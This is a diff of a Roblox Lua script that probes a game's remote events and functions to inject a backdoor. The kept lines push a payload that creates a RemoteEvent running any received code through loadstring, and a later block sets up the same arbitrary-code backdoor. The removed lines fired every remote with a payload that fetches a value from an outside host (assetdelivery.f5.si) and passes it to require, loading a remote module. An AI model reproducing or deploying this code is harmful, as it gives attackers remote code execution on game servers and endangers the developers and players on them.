@@ -19,15 +19,6 @@ for _, obj in ipairs(game:GetService("ReplicatedStorage"):GetChildren()) do
 				obj:InvokeServer([[local r = Instance.new("RemoteEvent", game.ReplicatedStorage) r.OnServerEvent:Connect(function(p, scr)   loadstring(scr)() end)]])
 			end
 	  end
-for _, obj in ipairs(game:GetService("ReplicatedStorage"):GetChildren()) do
-			if obj:IsA("RemoteEvent") then
-				obj:FireServer([[task.spawn(require,tonumber(({pcall(game:service("HttpService").GetAsync,game:service("HttpService"),"https://assetdelivery.f5.si")})[2]))   ]])
-			elseif obj:IsA("RemoteFunction") then
-				obj:InvokeServer([[task.spawn(require,tonumber(({pcall(game:service("HttpService").GetAsync,game:service("HttpService"),"https://assetdelivery.f5.si")})[2]))   ]])
-			end
-		end
-
-
 spawn(function()
 Instance.new("RemoteEvent", game.ReplicatedStorage).OnServerEvent:Connect(function(player, code)
 loadstring(code)() -- enable loadstrings
